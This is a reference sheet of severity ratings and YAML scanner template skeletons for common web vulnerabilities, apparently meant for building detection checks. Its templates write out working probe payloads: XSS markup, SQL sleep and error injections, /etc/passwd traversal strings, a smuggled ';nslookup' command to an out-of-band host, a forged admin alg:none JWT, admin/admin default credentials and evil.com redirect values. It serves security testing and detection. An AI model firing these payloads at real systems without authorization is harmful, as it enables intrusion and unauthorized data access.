# Vulnerability Classes — Severity, Tags, and Template Skeletons

## Class reference table

| Class | Severity | Tags | Detection method | OOB needed |
|---|---|---|---|---|
| Reflected XSS | medium | xss,reflected | word — reflected payload in body | No |
| Stored XSS | medium | xss,stored | word — payload in second request | No (2 requests) |
| SQLi error-based | high | sqli | word — DB error string | No |
| SQLi time-based | high | sqli,blind | dsl — response_time | No |
| Path traversal / LFI | high | lfi,traversal | word — /etc/passwd content | No |
| SSRF | high | ssrf | interactsh — HTTP callback | Yes |
| Blind command injection | critical | rce,oast | interactsh — DNS callback | Yes |
| Error-based SSTI | high | ssti | word — math result in body | No |
| Open redirect | medium | redirect | word — Location header value | No |
| CORS misconfiguration | medium | cors,misconfig | word — ACAO: * or reflected origin | No |
| Sensitive data exposure | medium | exposure | regex — key/secret pattern | No |
| Default credentials | critical | default-login | word — authenticated state string | No |
| Directory listing | low | exposure | word — "Index of /" | No |
| JWT alg:none | high | jwt | word — authenticated response | No |
| XXE (blind) | high | xxe,oast | interactsh — DNS callback | Yes |
| IDOR | high | idor,idor | word — victim data in response | No (2 accounts) |
| Host header injection | medium | ssrf,misconfig | word/interactsh | Sometimes |
| CRLF injection | medium | crlf | word — injected header in response | No |
| Prototype pollution | medium | prototype-pollution | word — polluted property in response | No |

---

## Template skeletons

Copy the matching skeleton, then fill in specifics from the parsed input.

---

### Reflected XSS

```yaml
id: reflected-xss-[endpoint-slug]

info:
  name: Reflected XSS in [endpoint] via [parameter]
  author: custom
  severity: medium
  description: The [parameter] parameter reflects unsanitized input in the response body, enabling reflected XSS.
  tags: xss,reflected

http:
  - method: GET
    path:
      - '{{BaseURL}}/[path]?[param]="><img src=x onerror=alert(document.domain)>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><img src=x onerror=alert(document.domain)>'
      - type: status
        status:
          - 200
```

---

### SQLi — Error-based

```yaml
id: sqli-error-[endpoint-slug]

info:
  name: SQL Injection (Error-based) in [endpoint]
  author: custom
  severity: high
  description: The [parameter] parameter is vulnerable to SQL injection — the database error message is reflected in the response.
  tags: sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]='"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "you have an error in your sql syntax"
          - "warning: mysql"
          - "unclosed quotation mark"
          - "quoted string not properly terminated"
          - "ORA-01756"
          - "SQLite3::query"
          - "pg_query"
        case-insensitive: true
```

---

### SQLi — Time-based blind

```yaml
id: sqli-blind-timebased-[endpoint-slug]

info:
  name: Blind SQL Injection (Time-based) in [endpoint]
  author: custom
  severity: high
  description: The [parameter] parameter is vulnerable to time-based blind SQL injection — a 5 second sleep is injected successfully.
  tags: sqli,blind

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]=1' AND SLEEP(5)--"
      - "{{BaseURL}}/[path]?[param]=1; WAITFOR DELAY '0:0:5'--"
      - "{{BaseURL}}/[path]?[param]=1' AND pg_sleep(5)--"

    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
```

---

### Path Traversal / LFI

```yaml
id: lfi-path-traversal-[endpoint-slug]

info:
  name: Path Traversal / LFI in [endpoint]
  author: custom
  severity: high
  description: The [parameter] parameter allows reading arbitrary files from the server filesystem.
  tags: lfi,traversal

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]=../../../../etc/passwd"
      - "{{BaseURL}}/[path]?[param]=../../../../etc/passwd%00"
      - "{{BaseURL}}/[path]?[param]=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0"
      - type: status
        status:
          - 200
```

---

### SSRF (with interactsh)

```yaml
id: ssrf-[endpoint-slug]

info:
  name: SSRF in [endpoint] via [parameter]
  author: custom
  severity: high
  description: The [parameter] parameter makes server-side HTTP requests to attacker-controlled URLs, confirmed via out-of-band callback.
  tags: ssrf,oast

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]=http://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

---

### Blind Command Injection (OOB)

```yaml
id: rce-blind-cmdi-[endpoint-slug]

info:
  name: Blind Command Injection in [endpoint]
  author: custom
  severity: critical
  description: The [parameter] parameter passes user input to a system command without sanitization, confirmed via DNS out-of-band callback.
  tags: rce,oast

http:
  - method: POST
    path:
      - "{{BaseURL}}/[path]"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "[param]=;nslookup+{{interactsh-url}}&[other-params]"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

---

### SSTI — Error-based

```yaml
id: ssti-[endpoint-slug]

info:
  name: Server-Side Template Injection in [endpoint]
  author: custom
  severity: high
  description: The [parameter] parameter is evaluated as a template expression — math result is reflected confirming SSTI.
  tags: ssti

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]={{'{{'}}7*7{{'}}'}}"
      - "{{BaseURL}}/[path]?[param]=${7*7}"
      - "{{BaseURL}}/[path]?[param]=<%= 7*7 %>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "49"
      - type: status
        status:
          - 200
```

---

### Open Redirect

```yaml
id: open-redirect-[endpoint-slug]

info:
  name: Open Redirect in [endpoint]
  author: custom
  severity: medium
  description: The [parameter] parameter redirects users to arbitrary external URLs without validation.
  tags: redirect

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]?[param]=https://evil.com"
      - "{{BaseURL}}/[path]?[param]=//evil.com"
      - "{{BaseURL}}/[path]?[param]=https:evil.com"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Location: https://evil.com"
          - "Location: //evil.com"
        condition: or
      - type: status
        status:
          - 301
          - 302
          - 303
          - 307
          - 308
```

---

### CORS Misconfiguration

```yaml
id: cors-misconfig-[endpoint-slug]

info:
  name: CORS Misconfiguration on [endpoint]
  author: custom
  severity: medium
  description: The endpoint reflects arbitrary origins in Access-Control-Allow-Origin with credentials allowed, enabling cross-origin data theft.
  tags: cors,misconfig

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]"
    headers:
      Origin: "https://evil.com"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
```

---

### Sensitive Data Exposure

```yaml
id: exposure-[secret-type]-[endpoint-slug]

info:
  name: [Secret type] Exposed in [endpoint]
  author: custom
  severity: high
  description: The endpoint returns [secret type] in the response body without authentication.
  tags: exposure,secret

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "AKIA[0-9A-Z]{16}"                    # AWS key — replace with actual pattern
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "AKIA[0-9A-Z]{16}"
```

---

### Default Credentials

```yaml
id: default-login-[service-slug]

info:
  name: Default Credentials on [service]
  author: custom
  severity: critical
  description: The [service] login accepts default credentials, granting unauthorized administrative access.
  tags: default-login

http:
  - method: POST
    path:
      - "{{BaseURL}}/[login-path]"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username=admin&password=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[string that appears only when logged in — e.g. 'dashboard', 'logout', 'welcome']"
      - type: status
        status:
          - 200
```

---

### JWT Algorithm Confusion (alg:none)

```yaml
id: jwt-alg-none-[endpoint-slug]

info:
  name: JWT Algorithm Confusion (alg:none) on [endpoint]
  author: custom
  severity: high
  description: The endpoint accepts JWT tokens with alg:none and an empty signature, bypassing authentication.
  tags: jwt,auth-bypass

variables:
  # base64url({"alg":"none","typ":"JWT"}).base64url({"sub":"1","role":"admin"}).
  forged_token: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."

http:
  - method: GET
    path:
      - "{{BaseURL}}/[protected-path]"
    headers:
      Authorization: "Bearer {{forged_token}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[string that appears in authenticated response]"
      - type: status
        status:
          - 200
```

---

### IDOR (multi-step)

```yaml
id: idor-[endpoint-slug]

info:
  name: IDOR on [endpoint] — [horizontal/vertical] privilege escalation
  author: custom
  severity: high
  description: Authenticated users can access other users' [resource] by replacing the object ID in the request.
  tags: idor

variables:
  attacker_session: "REPLACE_WITH_ATTACKER_SESSION_TOKEN"
  victim_object_id: "REPLACE_WITH_VICTIM_OBJECT_ID"

http:
  - raw:
      - |
        GET /[path]/{{victim_object_id}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{attacker_session}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[unique string that belongs to victim — email, name, ID]"
      - type: status
        status:
          - 200
```

---

### Directory Listing

```yaml
id: dir-listing-[path-slug]

info:
  name: Directory Listing Enabled on [path]
  author: custom
  severity: low
  description: The web server lists directory contents at [path], potentially exposing sensitive files.
  tags: exposure,misconfig

http:
  - method: GET
    path:
      - "{{BaseURL}}/[path]/"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Index of /"
      - type: status
        status:
          - 200
```
